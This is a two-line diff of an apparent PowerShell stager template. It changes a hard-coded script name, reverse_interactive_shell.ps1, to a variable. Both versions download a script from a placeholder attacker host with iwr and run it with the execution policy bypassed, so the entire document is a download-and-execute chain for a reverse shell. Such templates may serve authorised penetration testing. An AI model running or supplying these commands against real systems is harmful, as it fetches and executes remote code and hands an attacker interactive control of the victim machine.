@@ -1,2 +1,2 @@
-iwr -Uri "http://${http_ip}:${http_port}/reverse_interactive_shell.ps1" -OutFile "reverse_interactive_shell.ps1";
-powershell -ep bypass ./reverse_interactive_shell.ps1;
+iwr -Uri "http://${http_ip}:${http_port}/${filename}" -OutFile "${filename}";
+powershell -ep bypass ./${filename};
